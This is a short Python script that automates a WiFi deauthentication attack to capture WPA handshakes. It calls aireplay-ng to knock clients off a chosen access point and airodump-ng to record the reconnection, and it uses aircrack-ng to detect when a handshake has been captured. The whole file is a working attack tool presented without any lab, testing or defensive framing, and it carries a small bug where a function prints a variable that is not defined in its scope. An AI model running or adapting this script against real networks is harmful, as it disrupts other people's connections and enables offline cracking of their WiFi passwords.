import subprocess
import threading
from pathlib import Path
from deauth import list_interface,start_monitor_mode,stop_monitor_mode,list_monitor_interface
from wifi_list import displayWifi
import os
import time

BDIR = (Path(__file__).resolve().parent)/"cap"
BDIR.mkdir(parents=True, exist_ok=True)
def startDeauth(wifi,bssid):
    print(wifi,bssid)
    command = ["sudo","aireplay-ng","-0","20","-a",bssid,wifi]
    subprocess.run(command,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("okay")

def is_hashCreated():
    hash = BDIR/"capture-01.cap"
    if hash.exists():
        command = ["aircrack-ng", "-w", "/dev/null", str(hash)]
        result = subprocess.run(command, capture_output=True, text=True)
        if "handshake" in result.stdout.lower():
            print("gotit")
            return True
    return False

def startLesener(mac,channel,wifi):
    print(wifi,bssid,channel)
    command = [
        "sudo", "airodump-ng",
        "--bssid", mac,
        "--channel", str(channel),
        "-w", str(BDIR / "capture"),
        "--output-format", "pcap",
        wifi
    ]
    # stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    process = subprocess.Popen(command,stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    while True:
        if is_hashCreated():
            process.terminate()  # Terminate the subprocess
            process.wait()     
            return
        
def deleteCap():
    for file in BDIR.glob("*.cap"):
        os.remove(file)

wifiInterface = list_interface()
start_monitor_mode(wifiInterface)
bssid,channel = displayWifi()

#start leasening
leasener_thread = threading.Thread(target=startLesener,args=(bssid,channel,wifiInterface))
leasener_thread.start()
time.sleep(2)
startDeauth(wifiInterface,bssid)
time.sleep(5)

leasener_thread.join()
#delete all file
# deleteCap()
mo_wivi = list_monitor_interface()
stop_monitor_mode(mo_wivi)